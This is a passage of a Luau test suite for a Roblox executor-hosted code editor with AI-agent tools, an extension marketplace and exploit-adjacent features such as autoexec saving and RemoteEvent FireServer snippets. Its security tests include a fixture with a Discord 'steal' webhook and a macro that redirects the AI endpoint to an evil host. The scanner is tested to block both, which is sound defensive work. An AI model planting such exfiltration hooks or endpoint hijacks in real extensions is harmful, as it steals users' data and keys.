	assertEq(pill.Visible, true, "MinimizedPill visible")
	H.drag(pill, 40, 350, 220, 120)
	assertEq(api.app.window.minimised, true, "Dragging MinimizedPill repositioned it without accidentally restoring")
	assertTrue(pill.Position.X.Offset >= 150, "MinimizedPill moved to new X position")
	H.click(pill)
	assertEq(api.app.window.minimised, false, "Tapping MinimizedPill restored window")

	api.setMobileMode(false)
	H.setViewport(1440, 900)
	api.runCommand("window.center")

	-- =========================================================================
	-- (C) True Multi-Tab Overflow Picker (`▾ N`) + Narrow Phone Breakpoints (`360px`)
	-- =========================================================================
	for i = 1, 5 do
		api.writeFile(string.format("src/multitab_%d.luau", i), string.format("return %d\n", i))
		api.openFile(string.format("src/multitab_%d.luau", i))
	end
	local allTabsBtn = H.byName("AllOpenTabsBtn")
	assertTrue(allTabsBtn ~= nil and allTabsBtn.Text:find("▾ ", 1, true) ~= nil, "AllOpenTabsBtn (`▾ N`) mounted in TabBar")
	assertTrue(#api.codeStore.tabs >= 5, "Multiple tabs open simultaneously without replacing each other")
	assertEq(H.byName("ScrollTabsLeftBtn").Visible, true, "Multi-tab `‹` horizontal scroll button active")

	-- Shrink viewport to Portrait Phone (`380x680`) in Desktop Mode -> Zero-overlap Compact Menu & `⋯` Overflow!
	H.setViewport(380, 680)
	assertEq(H.byName("MenuBar").Visible, false, "Full 5-item MenuBar collapsed on 380px portrait phone")
	assertEq(H.byName("CompactMenuBtn").Visible, true, "Compact `≡ Menu` button shown on 380px portrait phone")
	assertEq(H.byName("CompactMoreBtn").Visible, true, "Compact `⋯` overflow button shown on 380px portrait phone")
	assertTrue(H.byName("PrimarySideBar").Size.X.Offset <= 180, "Desktop Sidebar clamped on 380px width so Editor stays usable")

	H.setViewport(1440, 900)
	api.runCommand("window.center")
end)

check("12. Combined Sprint v2B — VS Code Integrated AI Editor, Static CDN 10/Page Hub, Sub-Issue SemVer & Power Tools", function()
	-- (A) VS Code Secondary Right-Side AI Sidebar (`AIChatSidebar`) + Attribution + Zero-Key Inline `Ctrl+I`
	local aiBtn = H.byName("AiChatBtn")
	assertTrue(aiBtn ~= nil, "`✦ AI` Titlebar button exists")
	H.click(aiBtn)
	local aiSidebar = H.byName("AIChatSidebar")
	assertTrue(aiSidebar ~= nil and aiSidebar.Visible == true, "Clicking `✦ AI` opened VS Code Secondary Right-Side AI Sidebar")
	local attrLbl = H.byName("AiAttributionLabel")
	assertTrue(attrLbl ~= nil and attrLbl.Text:find("Project UAI", 1, true) ~= nil, "AI Sidebar explicitly credits Project UAI (MIT © CarlDV / Project-Ptolemy)")
	assertTrue(H.byName("OpenProjectUaiBtn") ~= nil, "AI sidebar exposes the explicit official Project UAI integration button")
	local genv = H.sandbox.getgenv()
	local originalUai = genv.UAI
	local uaiShowCalls = 0
	genv.UAI = {
		alive = true,
		version = "4.1.1",
		build = "test-build",
		sdk = {
			version = "1.1.0",
			features = { requests = true, resourceScopes = true },
			createScope = function() end,
			request = function() end,
		},
		sessions = { open = function() end },
		show = function(panel)
			assertEq(panel, "chat", "Project UAI adapter opens the documented chat panel")
			uaiShowCalls = uaiShowCalls + 1
			return true
		end,
	}
	local compatibleUai = api.uaiAdapter.inspect()
	assertTrue(compatibleUai.compatible and compatibleUai.sdkVersion == "1.1.0", "UAI health adapter recognizes the documented SDK capability contract")
	local openedUai = api.uaiAdapter.open()
	assertTrue(openedUai and uaiShowCalls == 1, "UAI integration reuses a compatible live client through its public show method")
	genv.UAI.sdk.features.resourceScopes = false
	assertEq(api.uaiAdapter.inspect().status, "incompatible", "UAI adapter fails safely when a required upstream capability disappears")
	genv.UAI.sdk.features.resourceScopes = true
	genv.UAI.show = function() return false, "UAI vault is locked" end
	local rejectedUaiOpen, uaiOpenReason = api.uaiAdapter.open()
	assertTrue(not rejectedUaiOpen and tostring(uaiOpenReason):find("vault is locked", 1, true) ~= nil,
		"UAI adapter surfaces upstream admission failures without bypassing setup or unlock")
	genv.UAI = originalUai

	-- AI can inspect the full selected project tree with bounded/paged source reads.
	local projectListing = api.aiTools.execute("workspace_list_files", { limit = 5 })
	assertTrue(projectListing.ok and projectListing.total >= #projectListing.files and projectListing.root ~= nil,
		"AI workspace listing recursively reports project root and paged file inventory")
	local otherProject = "ai_scope_test"
	H.sandbox.makefolder("VSRBLX/workspaces/" .. otherProject)
	H.sandbox.makefolder("VSRBLX/workspaces/" .. otherProject .. "/src")
	H.sandbox.writefile("VSRBLX/workspaces/" .. otherProject .. "/src/authorized.luau", "return 'authorized project'\n")
	local deniedProjectRead = api.aiTools.execute("workspace_read_file", {
		project = otherProject,
		path = "src/authorized.luau",
	})
	assertTrue(not deniedProjectRead.ok, "AI cannot read another named project before explicit authorization")
	local availableProjects = api.aiTools.execute("workspace_list_available_projects", {})
	assertTrue(availableProjects.ok and table.concat(availableProjects.projects, ","):find(otherProject, 1, true) ~= nil,
		"AI can see project names without receiving their content access")
	assertTrue(api.aiTools.find("workspace_authorize_project").requiresApproval == true,
		"Named-project authorization requires an in-UI approval even in Auto Edit mode")
	local projectGrant = api.aiTools.execute("workspace_authorize_project", { project = otherProject })
	assertTrue(projectGrant.ok and projectGrant.access == "read-only for this conversation",
		"Explicit authorization grants read-only access to the requested named project")
	local authorizedProjectRead = api.aiTools.execute("workspace_read_file", {
		project = otherProject,
		path = "src/authorized.luau",
	})
	assertTrue(authorizedProjectRead.ok and authorizedProjectRead.content:find("authorized project", 1, true) ~= nil,
		"Authorized project content is readable without switching the active editor workspace")
	assertTrue(api.aiTools.execute("workspace_list_files", { project = otherProject }).ok
		and api.aiTools.execute("workspace_search", { project = otherProject, query = "authorized project" }).ok,
		"Explicitly authorized named projects support complete AI listing and search")
	local activeThreadForGrant = api.aiAgent.currentThread()
	api.aiTools.setThread("unrelated-thread-scope")
	assertTrue(not api.aiTools.execute("workspace_read_file", {
		project = otherProject,
		path = "src/authorized.luau",
	}).ok, "Named project authorization does not leak across AI conversations")
	if activeThreadForGrant then api.aiTools.setThread(activeThreadForGrant.id) end
	local projectPage = api.aiTools.execute("workspace_read_file", {
		path = "src/main.luau",
		max_bytes = 16,
	})
	assertTrue(projectPage.ok and projectPage.truncated and projectPage.nextOffset > 0 and #projectPage.content <= 16,
		"AI project-file reads return bounded pages for large source files")
	local projectPage2 = api.aiTools.execute("workspace_read_file", {
		path = "src/main.luau",
		offset = projectPage.nextOffset,
		max_bytes = 16,
	})
	assertTrue(projectPage2.ok and projectPage2.offset >= projectPage.nextOffset and projectPage2.content ~= "",
		"AI can continue reading a project source file with the next offset")

	-- AI-generated artifacts have an executor-backed root that cannot spill into the game project.
	local isolatedPath = "roadmap_isolation_fixture.luau"
	local isolatedWrite = api.aiTools.execute("ai_workspace_write_file", {
		path = isolatedPath,
		content = "return 'private AI workspace'",
	})
	assertTrue(isolatedWrite.ok and isolatedWrite.root:find("/ai/workspaces/", 1, true) ~= nil,
		"AI artifact tool writes into the dedicated AI workspace root")
	assertEq(api.workspace.readFile(isolatedPath), nil, "AI workspace file is not visible in the active game/project workspace")
	local isolatedRead = api.aiTools.execute("ai_workspace_read_file", { path = isolatedPath })
	assertTrue(isolatedRead.ok and isolatedRead.content == "return 'private AI workspace'", "AI workspace read tool retrieves its own file")
	local isolatedListing = api.aiTools.execute("ai_workspace_list_files", { limit = 20 })
	assertTrue(isolatedListing.ok and #isolatedListing.files >= 1, "AI workspace provides a separate paged file listing")
	local currentThread = api.aiAgent.currentThread()
	local firstThreadId = currentThread and currentThread.id or "thread-test-one"
	api.aiWorkspace.setThread(firstThreadId)
	local perThreadPath = "thread_scope_fixture.txt"
	api.aiWorkspace.writeFile(perThreadPath, "first thread artifact")
	api.aiWorkspace.setThread("thread-test-two")
	assertEq(api.aiWorkspace.readFile(perThreadPath), nil, "AI artifact workspace is isolated by thread")
	api.aiWorkspace.setThread(firstThreadId)
	assertEq(api.aiWorkspace.readFile(perThreadPath), "first thread artifact", "Returning to an AI thread restores its artifact scope")
	api.aiWorkspace.deleteFile(perThreadPath)
	if currentThread then api.aiWorkspace.setThread(currentThread.id) end
	local escapedWrite = api.aiWorkspace.writeFile("../workspace_escape.luau", "bad")
	assertEq(escapedWrite, false, "AI workspace rejects path traversal")
	assertTrue(api.aiTools.find("ai_workspace_transfer_to_project").requiresApproval == true,
		"AI artifact transfer always requires an in-UI approval even in Auto Edit mode")
	local noConsent = api.aiTools.execute("ai_workspace_transfer_to_project", {
		source = isolatedPath,
		destination = "transferred_fixture.luau",
	})
	assertTrue(not noConsent.ok and api.workspace.readFile("transferred_fixture.luau") == nil,
		"AI artifact transfer refuses to run without explicit user consent flag")
	local approvedTransfer = api.aiTools.execute("ai_workspace_transfer_to_project", {
		source = isolatedPath,
		destination = "transferred_fixture.luau",
		confirm_transfer = true,
	})
	assertTrue(approvedTransfer.ok and api.workspace.readFile("transferred_fixture.luau") == "return 'private AI workspace'",
		"Explicitly approved AI artifact transfer copies into active project only")
	local overwriteBlocked = api.aiTools.execute("ai_workspace_transfer_to_project", {
		source = isolatedPath,
		destination = "transferred_fixture.luau",
		confirm_transfer = true,
	})
	assertTrue(not overwriteBlocked.ok, "AI artifact transfer refuses to overwrite existing project files by default")
	local overwriteApproved = api.aiTools.execute("ai_workspace_transfer_to_project", {
		source = isolatedPath,
		destination = "transferred_fixture.luau",
		confirm_transfer = true,
		overwrite_existing = true,
	})
	assertTrue(overwriteApproved.ok, "Existing project file replacement requires separate explicit approval")
	api.workspace.deletePath("transferred_fixture.luau")
	api.aiWorkspace.deleteFile(isolatedPath)

	-- AI can traverse the live DataModel and read script source when the executor exposes it.
	local fixtureRoot = H.sandbox.Instance.new("Folder")
	fixtureRoot.Name = "AgentTraversalFixture"
	fixtureRoot.Parent = H.sandbox.workspace
	local fixtureFolder = H.sandbox.Instance.new("Folder")
	fixtureFolder.Name = "Nested"
	fixtureFolder.Parent = fixtureRoot
	local fixtureScript = H.sandbox.Instance.new("ModuleScript")
	fixtureScript.Name = "FixtureModule"
	fixtureScript.Source = "return 42"
	fixtureScript.Parent = fixtureFolder
	local treeResult = api.aiTools.execute("inspect_roblox_tree", {
		path = "Workspace.AgentTraversalFixture",
		depth = 3,
		limit = 20,
	})
	assertTrue(treeResult.ok and treeResult.tree.children[1].children[1].isScript, "Live DataModel inspection recursively discovers nested script containers")
	local sourceResult = api.aiTools.execute("read_roblox_script", {
		path = "Workspace.AgentTraversalFixture.Nested.FixtureModule",
	})
	assertTrue(sourceResult.ok and sourceResult.source == "return 42", "AI can read live script source through the read-only DataModel tool")
	fixtureRoot:Destroy()

	-- Default Out-of-the-Box Provider is Kilo Code (`kilo` · `kilo-auto/free`) with ZERO API key required!
	assertEq(api.aiProviders.activeProviderId(), "kilo", "Default out-of-the-box AI provider is `kilo` (Kilo Code Free Gateway)")
	assertEq(api.aiProviders.activeModel(), "kilo-auto/free", "Default Kilo Code model is `kilo-auto/free` auto-router")
	assertEq(api.aiProviders.getProvider("kilo").requiresKey, false, "Kilo Code `:free` gateway requires NO API key")

	local kiloNoAuthVerified = false
	H.onHttp(function(req, url)
		if url == "https://api.kilo.ai/api/gateway/chat/completions" then
			local payload = json.decode(req.Body or "{}") or {}
			local systemMessage = payload.messages and payload.messages[1] and payload.messages[1].content or ""
			assertTrue(systemMessage:find("observable acceptance criteria", 1, true) ~= nil, "AI system prompt guides complex tasks through criteria and staged implementation")			assertTrue(systemMessage:find("complete solution", 1, true) ~= nil, "AI system prompt explicitly rejects incomplete stubs for full implementation requests")			local hdrs = req and (req.Headers or req.headers) or {}
			assertEq(hdrs["Authorization"], nil, "Anonymous Kilo Code `:free` request sends NO Authorization header when unkeyed")
			kiloNoAuthVerified = true
			return {
				StatusCode = 200,
				Body = table.concat({
					'data: {"choices":[{"delta":{"content":"```luau\\nlocal freeKilo = true\\n```"},"finish_reason":"stop"}]}\n\n',
					'data: [DONE]\n\n',
				}),
			}
		elseif url == "https://api.kilo.ai/api/gateway/models" then
			return {
				StatusCode = 200,
				Body = json.encode({
					data = {
						{ id = "kilo-auto/free", pricing = { prompt = "0", completion = "0" } },
						{ id = "x-ai/grok-code-fast-1:free", pricing = { prompt = "0", completion = "0" } },
						{ id = "anthropic/claude-paid-only", pricing = { prompt = "0.000003", completion = "0.000015" } },
					},
				}),
			}
		end
	end)

	local kiloReply = api.aiAgent.send("Generate a freeKilo flag")
	assertTrue(kiloNoAuthVerified and kiloReply ~= nil and kiloReply.codeBlock:find("freeKilo", 1, true) ~= nil, "Kilo Code `kilo-auto/free` answered over SSE with zero API key!")

	-- Saved AI conversation management: persistence, search, switching, rename and delete.
	local firstThread = api.aiAgent.currentThread()
	assertTrue(firstThread ~= nil and firstThread.title:find("Generate a freeKilo flag", 1, true) ~= nil, "First user prompt names the active saved chat")
	assertTrue(#api.aiAgent.searchThreads("freeKilo") >= 1, "Saved chat search matches conversation content")
	local scratchThread = api.aiAgent.createThread("Scratch planning chat")
	assertTrue(scratchThread ~= nil and #api.aiAgent.messages == 0, "Create starts an independent empty conversation")
	assertTrue(api.aiAgent.renameThread(scratchThread.id, "Renamed planning chat"), "Rename updates a saved conversation title")
	assertTrue(#api.aiAgent.searchThreads("Renamed planning") == 1, "Search matches renamed chat title")
	assertTrue(api.aiAgent.switchThread(firstThread.id), "Switch restores the earlier conversation")
	assertTrue(#api.aiAgent.messages >= 2 and api.aiAgent.messages[1].role == "user", "Switched transcript retains saved user and assistant messages")
	assertTrue(api.aiAgent.switchThread(scratchThread.id), "Switch returns to the renamed conversation")
	assertTrue(api.aiAgent.archiveThread(scratchThread.id), "Archive marks the current conversation and switches to an active chat")
	local archivedMatches = api.aiAgent.searchThreads("Renamed planning")
	assertTrue(#archivedMatches == 1 and archivedMatches[1].archived == true, "Archived conversations remain searchable and are labeled")
	assertTrue(api.aiAgent.archiveThread(scratchThread.id, false), "Restore unarchives a saved conversation")
	local exportPath = api.aiAgent.exportThread(scratchThread.id)
	assertTrue(type(exportPath) == "string" and exportPath:find("ai/exports/", 1, true) == 1, "Export writes a local JSON conversation file")
	local exportData = json.decode(api.fs.read(exportPath) or "{}")
	assertEq(exportData.title, "Renamed planning chat", "Conversation export contains the renamed thread")
	assertTrue(api.aiAgent.deleteThread(scratchThread.id), "Delete removes a saved conversation")
	assertEq(#api.aiAgent.listThreads(), 1, "Delete leaves the retained conversation intact")
	local newChatButton = H.byName("AiNewChatBtn")
	assertTrue(newChatButton ~= nil, "AI chat header exposes a new-conversation button")
	H.click(newChatButton)
	local uiCreatedThread = api.aiAgent.currentThread()
	assertTrue(uiCreatedThread ~= nil and uiCreatedThread.title == "New Chat", "New-conversation button creates and activates an empty saved chat")
	assertTrue(api.aiAgent.switchThread(firstThread.id), "Switch back to original conversation after UI create")
	assertTrue(H.byName("AiThreadBtn").Text:find(firstThread.title, 1, true) ~= nil, "Header title tracks active-conversation changes")
	assertTrue(api.aiAgent.deleteThread(uiCreatedThread.id), "Clean up UI-created test conversation")
	local persistedRaw = api.fs.read("ai/threads/index.json")
	assertEq(api.aiAgent.historySaveError, nil, "Saved conversation index has no persistence error")
	local persistedThreads = json.decode(persistedRaw or "{}")
	assertTrue(type(persistedThreads.threads) == "table" and #persistedThreads.threads == 1, "Thread index persisted to the virtual/executor filesystem")
	assertTrue(api.aiAgent.switchThread(firstThread.id), "Active conversation restored after deleting the other thread")

	local syncedFreeModels = api.aiProviders.refreshKiloFreeModels()
	assertTrue(type(syncedFreeModels) == "table" and #syncedFreeModels == 2, "Live Kilo `:free` model sync kept 2 free models and filtered out paid model")
	assertEq(syncedFreeModels[2], "x-ai/grok-code-fast-1:free", "Live Kilo model sync discovered `x-ai/grok-code-fast-1:free`")

	-- Inline `Ctrl+I` Floating Bar with Built-In Offline Smart Luau Mode (`local_smart`)
	api.writeFile("src/inline_target.luau", "local speed = 16\n")
	local inlineDoc = api.openFile("src/inline_target.luau", { reloadFromDisk = true })
	api.aiProviders.setActiveProvider("local_smart")
	api.runCommand("ai.inlineEdit")
	local inlineBar = H.byName("InlineAiBar")
	assertTrue(inlineBar ~= nil and inlineBar.Visible == true, "`Ctrl+I` opened Floating Inline AI Edit Bar")
	local inlineInput = H.byName("InlineAiInput"):FindFirstChild("Field")
	inlineInput.Text = "add pcall remote wrapper"
	H.click(H.byName("InlineAiGenerateBtn"))
	assertTrue(inlineBar.Visible == true, "Inline AI Bar generated preview awaiting Accept/Diff/Discard")
	H.click(H.byName("InlineAiAcceptBtn"))
	assertEq(inlineBar.Visible, false, "`[✓ Accept]` closed Inline AI Bar after applying edit")
	assertTrue(inlineDoc.content:find("pcall", 1, true) ~= nil, "`[✓ Accept]` inserted generated Luau code into active buffer")

	-- (B) Vault-Encrypted AI API Key Storage (Zero Plaintext in `settings.json`)
	assertTrue(api.cryptoVault.isUnlocked(), "Master Vault remained unlocked from Suite 11")
	local okKey = api.aiProviders.setApiKey("openai", "sk-live-secret-ai-key-999")
	assertTrue(okKey == true, "Saved OpenAI API key through Master Vault")
	assertEq(api.aiProviders.getApiKey("openai"), "sk-live-secret-ai-key-999", "Retrieved OpenAI API key from unlocked Master Vault")
	local rawCfg = H.sandbox.isfile("VSRBLX/settings.json") and H.sandbox.readfile("VSRBLX/settings.json") or ""
	assertEq(rawCfg:find("sk%-live%-secret%-ai%-key%-999"), nil, "Plaintext settings.json NEVER stores AI API keys!")

	-- (C) Buffered OpenAI SSE Stream Replay + Multi-Turn Agent Tool Loop + 3-Mode Permission Gate (`read_only` / `ask_first` / `auto`)
	api.writeFile("src/agent_edit.luau", "local DAMAGE = 10\nreturn DAMAGE\n")
	api.openFile("src/agent_edit.luau", { reloadFromDisk = true })
	api.aiProviders.setActiveProvider("openai")

	local sseTurn = 0
	H.onHttp(function(_req, url)
		if url == RAW_URL then
			return { StatusCode = 200, Body = bundleSource }
		elseif url:find("api%.openai%.com/v1/chat/completions") then
			sseTurn = sseTurn + 1
			if sseTurn == 1 then
				-- Streamed SSE tool_call delta requesting `workspace_edit_file`
				local sseBody = table.concat({
					'data: {"choices":[{"delta":{"reasoning_content":"Inspecting DAMAGE constant..."}}]}\n\n',
					'data: {"choices":[{"delta":{"tool_calls":[{"index":0,"id":"call_edit_1","function":{"name":"workspace_edit_file","arguments":"{\\"path\\":\\"src/agent_edit.luau\\","}}]}}]}\n\n',
					'data: {"choices":[{"delta":{"tool_calls":[{"index":0,"function":{"arguments":"\\"old_text\\":\\"local DAMAGE = 10\\",\\"new_text\\":\\"local DAMAGE = 25\\"}"}}]},"finish_reason":"tool_calls"}]}\n\n',
					'data: [DONE]\n\n',
				})
				return { StatusCode = 200, Body = sseBody }
			else
				local sseDone = table.concat({
					'data: {"choices":[{"delta":{"content":"Updated `DAMAGE` from 10 to 25 cleanly."},"finish_reason":"stop"}]}\n\n',
					'data: [DONE]\n\n',
				})
				return { StatusCode = 200, Body = sseDone }
			end
		end
	end)

	-- 1) `read_only` blocks mutating tool (`workspace_edit_file`)
	sseTurn = 0
	api.aiAgent.send("Bump DAMAGE to 25", { permissionMode = "read_only" })
	assertEq(api.readFile("src/agent_edit.luau"), "local DAMAGE = 10\nreturn DAMAGE\n", "`read_only` permission mode blocked `workspace_edit_file`")

	-- 2) `ask_first` pauses on `workspace_edit_file` until explicitly approved!
	sseTurn = 0
	local askApproved = false
	local finalMsg = api.aiAgent.send("Bump DAMAGE to 25", {
		permissionMode = "ask_first",
		onApprove = function(toolName, _parsedArgs)
			assertEq(toolName, "workspace_edit_file", "`ask_first` surfaced exact tool name for approval")
			assertEq(api.readFile("src/agent_edit.luau"), "local DAMAGE = 10\nreturn DAMAGE\n", "File untouched prior to user approval")
			askApproved = true
			return true
		end,
	})
	assertTrue(finalMsg ~= nil and askApproved, "`ask_first` gated and resumed after user approval")
	assertEq(api.readFile("src/agent_edit.luau"), "local DAMAGE = 25\nreturn DAMAGE\n", "Surgical `workspace_edit_file` updated DAMAGE = 25 after approval")
	assertTrue(finalMsg.text:find("25", 1, true) ~= nil, "Final SSE assistant response assembled after tool loop")

	-- (D) Cooperative Infinite-Loop Protection in `run_luau_bounded` + Non-Executing `check_luau_syntax`
	local badSyn = api.aiTools.execute("check_luau_syntax", { code = "local x = (" })
	assertEq(badSyn.ok, false, "`check_luau_syntax` caught syntax error without executing")
	local infRes = api.aiTools.execute("run_luau_bounded", {
		code = "local n = 0\nwhile true do\n\tn = n + 1\nend",
		timeoutSeconds = 0.05,
	})
	assertEq(infRes.ok, false, "`run_luau_bounded` aborted infinite `while true do` loop cleanly via injected cooperative deadline")
	assertTrue(tostring(infRes.error):find("Execution deadline exceeded", 1, true) ~= nil, "Reported cooperative deadline error without freezing host")

	-- (E) Zero-Rate-Limit Static CDN Marketplace (`10/page` + `[⬇ Load 10 More]`) + Sub-Issue SemVer Resolver
	local page1Items = {}
	for i = 1, 10 do
		page1Items[i] = {
			id = string.format("cdn-ext-%02d", i),
			name = string.format("CDN Pack %02d", i),
			version = "1.0.0",
			author = "CreatorA",
			summary = "Verified static CDN extension #" .. tostring(i),
			template = "snippet-pack",
			issueNumber = 200 + i,
			issueAuthor = "CreatorA",
			snippets = { { trigger = "cdn" .. i, label = "cdn" .. i, detail = "CDN", insert = "print(" .. i .. ")" } },
		}
	end
	local page2Items = {
		{
			id = "cdn-ext-11",
			name = "CDN Pack 11",
			version = "1.0.0",
			author = "CreatorB",
			summary = "Page 2 verified extension #11",
			template = "snippet-pack",
			issueNumber = 211,
			issueAuthor = "CreatorB",
			snippets = { { trigger = "cdn11", label = "cdn11", detail = "CDN", insert = "print(11)" } },
		},
		{
			id = "cdn-ext-12",
			name = "CDN Pack 12",
			version = "2.1.0",
			author = "CreatorB",
			summary = "Page 2 verified extension #12",
			template = "snippet-pack",
			issueNumber = 212,
			issueAuthor = "CreatorB",
			snippets = { { trigger = "cdn12", label = "cdn12", detail = "CDN", insert = "print(12)" } },
		},
	}

	H.onHttp(function(_req, url)
		if url == RAW_URL then
			return { StatusCode = 200, Body = bundleSource }
		elseif url:find("/registry/page%-1%.json") then
			return {
				StatusCode = 200,
				Body = json.encode({ page = 1, pageSize = 10, totalPages = 2, totalExtensions = 12, hasMore = true, items = page1Items }),
			}
		elseif url:find("/registry/page%-2%.json") then
			return {
				StatusCode = 200,
				Body = json.encode({ page = 2, pageSize = 10, totalPages = 2, totalExtensions = 12, hasMore = false, items = page2Items }),
			}
		end
	end)

	api.runCommand("workbench.viewExtensions")
	local cdnList, cdnErr = api.extensionHub.loadMarketplacePage(1, { append = false })
	assertTrue(type(cdnList) == "table" and #cdnList == 10, "Loaded Page 1 (`10` extensions) from Zero-Rate-Limit Static CDN (got " .. tostring(type(cdnList) == "table" and #cdnList or cdnList) .. ", err=" .. tostring(cdnErr) .. ", src=" .. tostring(api.extensionHub.lastSyncSource) .. ")")
	assertEq(api.extensionHub.lastSyncSource, "cdn", "Confirmed Static CDN source (`raw.githubusercontent.com`) with zero API quota used")
	assertEq(api.extensionHub.hasMorePages, true, "`hasMorePages == true` when Page 2 exists")
	local loadMoreBtn = H.byName("LoadMoreExtensionsBtn")
	assertTrue(loadMoreBtn ~= nil, "`[⬇ Load 10 More]` button rendered in Extensions viewlet")
	H.click(loadMoreBtn)
	assertEq(#api.extensionHub.remoteCatalog, 12, "Clicking `[⬇ Load 10 More]` appended Page 2 (`12` total verified extensions)")
	assertEq(api.extensionHub.hasMorePages, false, "`hasMorePages == false` on final page")

	-- GitHub Sub-Issues Automatic Newest-SemVer Resolver (Blocks Cross-Author Spoof & Tainted Sub-Issues!)
	local mkIssue = function(num, login, ver, extraSummary)
		return {
			number = num,
			title = "[EXT] SubIssue SemVer Test",
			user = { login = login },
			body = api.extensionHub.generateIssueMarkdown({
				id = "semver-family-pack",
				name = "SemVer Family Pack",
				version = ver,
				author = login,
				summary = "Clean release " .. ver .. (extraSummary or ""),
				template = "snippet-pack",
				snippets = { { trigger = "sv", label = "sv", detail = ver, insert = "-- " .. ver } },
			}),
		}
	end
	local parentIssue = mkIssue(300, "TrustedDev", "1.0.0")
	local cleanSub11 = mkIssue(301, "TrustedDev", "1.1.0")
	local cleanSub14 = mkIssue(302, "TrustedDev", "1.4.2")
	local spoofSub99 = mkIssue(303, "RandomSpoofer", "9.9.9")
	local malwareSub20 = mkIssue(304, "TrustedDev", "2.0.0", " https://discord.com/api/webhooks/1/steal")

	local famRes = api.extensionHub.resolveSubIssueFamily(parentIssue, {
		cleanSub11,
		cleanSub14,
		spoofSub99,
		malwareSub20,
	})
	assertTrue(famRes ~= nil and famRes.manifest ~= nil, "Resolved Sub-Issue extension family")
	assertEq(famRes.manifest.version, "1.4.2", "Selected highest clean SemVer (`1.4.2`) by same GitHub author, rejecting `9.9.9` spoof & `2.0.0` malware!")
	assertEq(famRes.rejectedSubIssues, 2, "Recorded both rejected sub-issues (cross-author spoof + malware)")

	-- Blocked `ai.*` setting in `command-macro` `setSetting` scanner
	local badAiMacro = api.scanExtension({
		id = "steal-ai-endpoint",
		name = "Bad AI Endpoint",
		version = "1.0.0",
		author = "bad",
		summary = "Tries to redirect AI base URL.",
		template = "command-macro",
		macros = {
			{
				id = "hijack",
				title = "Hijack AI",
				steps = { { op = "setSetting", key = "ai.customEndpoint", value = "http://evil.local" } },
			},
		},
	})
	assertEq(badAiMacro.ok, false, "Scanner blocked `ai.*` settings modification in community extensions")

	-- (F) Offline Workspace Snapshots, `autoexec` Saver, Remote Snippet Generator, Live Property Tweaker & `Ctrl+D`
	api.writeFile("src/snap_demo.luau", "return 'v1'\n")
	local snapMeta = api.snapshots.createSnapshot("before-refactor")
	assertTrue(snapMeta ~= nil and snapMeta.id ~= nil, "Created offline workspace snapshot under `VSRBLX/snapshots/`")
	api.writeFile("src/snap_demo.luau", "return 'broken_v2'\n")
	local okRestore = api.snapshots.restoreSnapshot(snapMeta.id)
	assertTrue(okRestore ~= nil and okRestore.restored >= 1, "Restored offline workspace snapshot")
	assertEq(api.readFile("src/snap_demo.luau"), "return 'v1'\n", "Snapshot restored exact `src/snap_demo.luau` content")

	-- Save to `autoexec/`
	api.openFile("src/snap_demo.luau", { reloadFromDisk = true })
	api.runCommand("workspace.saveAutoexec")
	assertEq(H.sandbox.readfile("autoexec/snap_demo.luau"), "return 'v1'\n", "`workspace.saveAutoexec` wrote active script into executor `autoexec/`")

	-- RemoteEvent `:FireServer` Snippet Generator + Live Property Tweaker
	local remEvent = H.sandbox.Instance.new("RemoteEvent")
	remEvent.Name = "SwingSword"
	remEvent.Parent = H.sandbox.game:GetService("ReplicatedStorage")
	local remSnip = api.robloxExplorer.generateRemoteSnippet(remEvent)
	assertTrue(remSnip ~= nil and remSnip:find(":FireServer(", 1, true) ~= nil and remSnip:find("SwingSword", 1, true) ~= nil, "Generated `:FireServer(...)` snippet for ReplicatedStorage RemoteEvent")

	local testPart = H.sandbox.Instance.new("Part")
	testPart.Name = "ArenaPlatform"
	testPart.Anchored = false
	testPart.Parent = H.sandbox.workspace
	local okProp = api.robloxExplorer.setPropertyLive(testPart, "Anchored", "true")
	assertTrue(okProp and testPart.Anchored == true, "`setPropertyLive` mutated live Workspace Part boolean property")

	-- `Ctrl+D` (`selectNextOccurrence`) + Touch `pasteText`
	api.writeFile("src/occ.luau", "local coins = 1\ncoins = coins + 5\n")
	local occDoc = api.openFile("src/occ.luau", { reloadFromDisk = true })
	local editorBox = H.byName("SourceTextBox")
	editorBox.CursorPosition = 8 -- inside `coins` (`local coins = 1`)
	editorBox.SelectionStart = -1
	api.runCommand("editor.selectNextOccurrence")
	assertEq(occDoc.content:sub(editorBox.SelectionStart, editorBox.CursorPosition - 1), "coins", "First `Ctrl+D` selected word `coins` under cursor")
	api.runCommand("editor.selectNextOccurrence")
	assertEq(editorBox.SelectionStart, 17, "Second `Ctrl+D` jumped selection to next occurrence of `coins` on line 2")
	assertEq(occDoc.content:sub(editorBox.SelectionStart, editorBox.CursorPosition - 1), "coins", "Second `Ctrl+D` highlighted second `coins` occurrence")

	-- Real editor input wiring: smart pair insertion updates the buffer, and the
	-- rendered caret/selection remains visible when typing or moving past the fold.
	local typeLines = {}
	for i = 1, 80 do typeLines[i] = "local item_" .. tostring(i) .. " = " .. tostring(i) end
	api.writeFile("src/type_scroll.luau", table.concat(typeLines, "\n"))
	local typeDoc = api.openFile("src/type_scroll.luau", { reloadFromDisk = true })
	local typeBox = api.app.primaryEditor.box
	local editorScroll = H.byName("EditorScroll")
	typeBox.Focused:Fire()
	typeBox.CursorPosition = #typeDoc.content + 1
	assertTrue(editorScroll.CanvasPosition.Y > 0, "Typing caret scrolls into view near the end of a long file")
	typeDoc = api.codeStore.get(typeDoc.id)
	typeBox.Text = "local t = "
	typeBox.CursorPosition = 12
	typeBox.Text = "local t = {"
	assertEq(typeDoc.content, "local t = {}", "TextBox input path applies smart pair insertion to the live buffer")
	assertEq(typeBox.CursorPosition, 12, "Smart pair insertion leaves caret between delimiters")
	local longDoc = api.openFile("src/type_scroll.luau", { reloadFromDisk = true })
	typeBox.CursorPosition = #longDoc.content + 1
	typeBox.Text = typeBox.Text .. "\nprint('typed at end')"
	typeBox.CursorPosition = #typeBox.Text + 1
	assertTrue(longDoc.content:find("typed at end", 1, true) ~= nil, "Typing into the file updates the active document content")
	assertTrue(editorScroll.CanvasPosition.Y > 0, "Caret remains visible after text is appended below the fold")

	-- Compact viewport regression: no fabricated minimum bounds, negative editor
	-- columns, or AI sidebar squeezing the editor into an unusable sliver.
	H.setViewport(360, 240)
	local compactWin = H.byName("VSCodeWindow")
	local compactMain = H.byName("MainEditorAndPanelStack")
	local compactBody = H.byName("WorkbenchBody")
	assertTrue(compactWin.AbsolutePosition.X >= 0 and compactWin.AbsolutePosition.Y >= 0, "Compact window stays within viewport origin")
